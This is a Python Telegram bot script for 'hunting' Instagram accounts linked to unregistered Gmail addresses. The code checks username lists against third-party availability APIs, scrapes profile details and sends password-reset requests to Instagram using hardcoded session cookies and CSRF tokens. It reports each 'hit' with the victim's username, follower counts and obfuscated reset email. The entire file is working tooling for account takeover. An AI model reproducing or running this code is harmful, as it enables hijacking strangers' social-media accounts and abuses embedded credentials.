import os , requests , telebot , telebot ; from telebot import types ; from uuid import uuid4 ; ud = str(uuid4()) ; from user_agent import generate_user_agent ; gd = str(generate_user_agent())
import requests;import json;cookies = {
    '_ga': 'GA1.1.868853150.1686571031',
    'uid': '0ab9d21b837ac3f8',
    'clickAds': '53',
    'pushNotification': '92',
    'pushPage': '19',
    'XSRF-TOKEN': 'eyJpdiI6Ikoydk1rOUVmMExPOGF1WUMxWTNpTnc9PSIsInZhbHVlIjoiSE5VU0lSOTZnQnRhTGdDeE1cL3dIcDJmcmhWbm5IdU9wN3VNbytJck9DSjlVU2xqVkhPRUJuR21pS1JIUjRWSWRnYzZLXC8xXC9lNVJubWtOVlRHcjd1TFwvYU5sZFBCMkN6Y0pjZHNRWXJzMkYwcVE1aDMyR0xrb2x3SHlBU3ptbHZLIiwibWFjIjoiYzNjYjNhNWE4NGFlNzhmMTNlMTJiNGIxNDNmMDVjYThjZGUzZGU4ZjExMTEwN2QzNjgwNWE0OTNlNzE1ZDc1YyJ9',
    'aig_session': 'eyJpdiI6IlFPaGc0UnY2bjNIWmxKeTBIbDVjXC9BPT0iLCJ2YWx1ZSI6IktVck9mTWF5UDdxY3RFXC9WeW5kR0ZTOTM5U3RjalBaSnlSd05mUlhkanN2NStldDhaSWtFXC9IeXFlbFFFNHNrS09VS3J4V2NDVWVpd0lncFljWEhJMGlERWpHSGZ4bWZGQTN5RVF0Mm9jT0NhR0xnRGFEaEs5eTRLSFlCd01OckkiLCJtYWMiOiIwNDEzNDBkNTc2NTRkMTkxODc2ZmUxZTIzOGQ0ODU1MWZmYWQyM2NmNGQ3MGQwZGU0OWUyMjEzMmRhOGU2ODAyIn0%3D',
    '_ga_2S9JP0SPEL': 'GS1.1.1686741984.2.1.1686742384.0.0.0',
};headers = {
    'authority': 'storiesig.info',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'if-none-match': 'W/"376-nN5i4Qu/s4Ex/bnNvBcI5Wa+U3U"',
    'referer': 'https://storiesig.info/en/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-token': 'null',
    'x-xsrf-token': 'eyJpdiI6Ikoydk1rOUVmMExPOGF1WUMxWTNpTnc9PSIsInZhbHVlIjoiSE5VU0lSOTZnQnRhTGdDeE1cL3dIcDJmcmhWbm5IdU9wN3VNbytJck9DSjlVU2xqVkhPRUJuR21pS1JIUjRWSWRnYzZLXC8xXC9lNVJubWtOVlRHcjd1TFwvYU5sZFBCMkN6Y0pjZHNRWXJzMkYwcVE1aDMyR0xrb2x3SHlBU3ptbHZLIiwibWFjIjoiYzNjYjNhNWE4NGFlNzhmMTNlMTJiNGIxNDNmMDVjYThjZGUzZGU4ZjExMTEwN2QzNjgwNWE0OTNlNzE1ZDc1YyJ9',
}

def info(user):
	try:
		
		url = requests.get(f'https://storiesig.info/api/ig/profile/{user}', cookies=cookies, headers=headers)
		data = json.loads(url.content)
		id = data['result']['id']
		user = data['result']['username']
		bio = data['result']['biography']
		name = data['result']['full_name']
		mn = data['result']['edge_owner_to_timeline_media']['count']
		followed = data['result']['edge_followed_by']['count']
		follow = data['result']['edge_follow']['count']
		img = data['result']['profile_pic_url']
		date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
		url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/';head ={
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'Cookie': 'mid=YgzPXAABAAFpu2FvBU3Nz814ooE5; csrftoken=DVpBRlGfuAZ0E7JtTnLD71F0mcnNV2tW',
'Cookie2': '$Version=1',
'Accept-Language': 'en-GB, en-US',
'X-IG-Connection-Type': 'WIFI',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip'
};data ={
"user_email":f"{user}",
"device_id":"android-ae9d37a73aa41d00",
"guid":"d038a34e-1663-4f2b-af9d-aae995d105c4",
"_csrftoken":"DVpBRlGfuAZ0E7JtTnLD71F0mcnNV2tW"
};req =requests.post(url,headers = head, data = data)
		if '"status":"ok"' in req.text:
            					rest = req.json()['obfuscated_email']
            					
		else:
            					rest = 'ملاوي'
            				

		tlg = f'''
⌯ Hi Qredes Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
⌯ User —>  {user}
⌯ Email —> {user}@gmail.com
⌯ Date —> {date}
⌯ Follower -> {followed} × {follow} <- Following ⌯
⌯ Id —> {id}
⌯ Bio —> {bio}
⌯ Name —> {name}
⌯ Reset —> {rest}
   BY : @Qredes
    ''';return tlg
		
	except:
		
		tlg = f'''
⌯ Hi Qredes Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
⌯ User —>  {user}
⌯ Email —> {user}@gmail.com
⌯ Date —> H
⌯ Follower -> H × H <- Following ⌯
⌯ Id —> H
⌯ Bio —> H
⌯ Name —> H
   BY : @Qredes
    '''
	return tlg
bot = telebot.TeleBot(input("- Enter Token : "))
@bot.message_handler(commands=['start'])
def srt(message):
	check = types.InlineKeyboardButton(text='ابدأ - Start ',callback_data='check')
	hg = types.InlineKeyboardMarkup(row_width=1);hg.add(check)
	bot.send_message(message.chat.id,text='اهلا بك عزيزي في بوت صيد متاحات انستكرام اختر من الازرار التاليه',reply_markup=hg)
@bot.callback_query_handler(func=lambda call:True)
def Call(call):
	if call.data=='check':
		sTo = bot.send_message(call.message.chat.id,text=f'- اهلاً بَك عزيزي ارسل الملف الان .')
		bot.register_next_step_handler(sTo,check)
def check(message):
	hit = 0
	unlink = 0
	num = 0
	unava = 0
	try:
		filename = message.document.file_name
		fil = bot.get_file(message.document.file_id)
		dow = bot.download_file(fil.file_path)
		with open(filename, 'wb') as f0:
			f0.write(dow)
			p_file = open(filename, "r")
			mssg=bot.send_message(message.chat.id,text="wait a letile ...")
	except:
		bot.send_message(message.chat.id,text='''*ارسل ملف صحيح *''',parse_mode="Markdown")
		return
	with open(filename, "r") as f4:
		all_line = f4.readlines()
		allline = len(all_line)
	file = open(filename,'r').read().splitlines()
	for user in file:
		try:
			email = user + '@gmail.com'
			if '_' in user:
				unlink+=1
				num+=1
				continue
			else:
						if requests.get(f'https://veneratedsnivelingthing.dheusissh3.repl.co/Qredes/email={email}').json()['available_instagram']=='good':
							if "Ok" in requests.get(f'https://apigmail.dheusissh3.repl.co/api/gmail/{user}').json()['status']:
								nn = user
								hit+=1
								num+=1
								Ronaldo = types.InlineKeyboardMarkup(row_width=1)
								zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1')
								zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2')
								zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3')
								zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4')
								zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes')
								Ronaldo.add(zr3,zr2,zr1,zr4,zr5)
								bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- The hunt has begun .",parse_mode='markdown',reply_markup=Ronaldo)
								bot.send_message(message.chat.id,info(user))
							else:
								unava+=1
								num+=1
								Ronaldo = types.InlineKeyboardMarkup(row_width=1)
								zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1')
								zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2')
								zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3')
								zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4')
								zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes')
								Ronaldo.add(zr3,zr2,zr1,zr4,zr5)
								bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- The hunt has begun .",parse_mode='markdown',reply_markup=Ronaldo)
						else:
							unlink+=1
							num+=1
							Ronaldo = types.InlineKeyboardMarkup(row_width=1)
							zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1')
							zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2')
							zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3')
							zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4')
							zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes')
							Ronaldo.add(zr3,zr2,zr1,zr4,zr5)
							bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- Draw has been started  .",parse_mode='markdown',reply_markup=Ronaldo)
		except:
		   continue
	bot.send_message(message.chat.id,'انتها الفحص')
if __name__=="__main__":
	bot.infinity_polling()
